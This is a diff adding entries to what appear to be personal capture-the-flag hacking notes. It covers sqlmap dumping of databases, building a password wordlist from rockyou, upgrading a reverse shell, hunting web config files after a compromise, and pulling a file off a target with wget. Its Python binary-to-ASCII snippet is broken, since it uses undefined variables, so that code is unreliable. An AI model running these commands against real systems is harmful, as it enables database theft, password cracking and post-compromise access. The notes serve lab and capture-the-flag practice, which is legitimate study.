@@ -53,3 +53,37 @@ target: `python3 -m http.server 8000`
 attacker: `wget http://TARGET_IP:8000/flag.txt`
 
 does not matter where the file is
+
+### SQL injection when it does not work but should
+
+1) capture the request in burpsuite
+2) go to burp's http history and save it as xml
+3) sqlmap -r request.xml [+ whatever options you want - eg. --dbs then --tables then --dump]
+
+### bin -> dec -> hex -> ascii conversion does not work in CyberChef
+
+do it in an online converter or python - eg.  you do this:
+
+```python
+# not str -> str like CyberChef does but working with numbers
+binary = str('binary_number') # bin
+decimal = int(b, 2) # bin -> dec
+# now you can continue online or in cyberchef
+# or python:
+hexadecimal = hex(d)[2:] # bin -> dec -> hex
+result = bytes.fromhex(h).decode('ASCII') # result
+print(result)
+```
+
+### four character lowercase alpha passwords from rockyou
+
+`cat /usr/share/wordlists/rockyou.txt | egrep '^[a-z]{4}$' > four.txt`
+
+### upgrade shell
+
+1) `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+2) Ctrl + z
+3) `stty raw -echo; fg`
+
+### web hacked - revshell but where next?
+try `/var/www/html` to find some config files 
